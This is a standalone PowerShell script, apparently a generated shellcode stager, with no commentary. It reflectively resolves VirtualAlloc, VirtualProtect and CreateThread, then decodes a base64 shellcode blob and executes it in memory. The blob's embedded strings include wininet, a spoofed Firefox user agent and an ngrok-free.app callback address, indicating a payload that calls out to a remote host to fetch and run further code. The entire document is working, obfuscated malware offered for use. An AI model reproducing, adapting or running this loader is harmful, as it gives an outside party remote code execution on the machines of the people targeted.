function fhq {
        Param ($rE7, $rNY)
        $f7 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $f7.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($f7.GetMethod('GetModuleHandle')).Invoke($null, @($rE7)))), $rNY))
}

function k8 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $dR5,
                [Parameter(Position = 1)] [Type] $q8JG = [Void]
        )

        $mhU = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $mhU.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $dR5).SetImplementationFlags('Runtime, Managed')
        $mhU.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $q8JG, $dR5).SetImplementationFlags('Runtime, Managed')

        return $mhU.CreateType()
}

[Byte[]]$k3eks = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUWVIi1JgVkiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVhIAdBeWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1PoVAAAAE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDE0Ljc7IHJ2OjEzMy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEzMy4wAFlTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BwAAAAzYzZjOWM4ODkwYTYubmdyb2stZnJlZS5hcHAAWkiJwUnHwLsBAABNMclTU2oDU0m6V4mfxgAAAAD/1ehLAAAAL09rcXhHa0VxZ0tVbjF5YlZUcG5nb3d1UmRVbENtR213T3ZreE1hSW1xbC1YRC0tYUE1TGUzRDREc2VSSWtIU0tVNFpxQVJ0MWEASInBU1pBWE0xyVNIuAAyqIQAAAAAUFNTScfC61UuO//VSInGagpfSInxah9aUmiAMwAASYngagRBWUm6dUaehgAAAAD/1U0xwFNaSInxTTHJTTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC66roVQAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWMNYagBZScfC8LWiVv/V")
[Uint32]$xta = 0
$dV = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fhq kernel32.dll VirtualAlloc), (k8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $k3eks.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($k3eks, 0, $dV, $k3eks.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fhq kernel32.dll VirtualProtect), (k8 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($dV, [Uint32]$k3eks.Length, 0x10, [Ref]$xta)) -eq $true) {
        $nDkeY = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fhq kernel32.dll CreateThread), (k8 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dV,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fhq kernel32.dll WaitForSingleObject), (k8 @([IntPtr], [Int32]))).Invoke($nDkeY,0xffffffff) | Out-Null
}
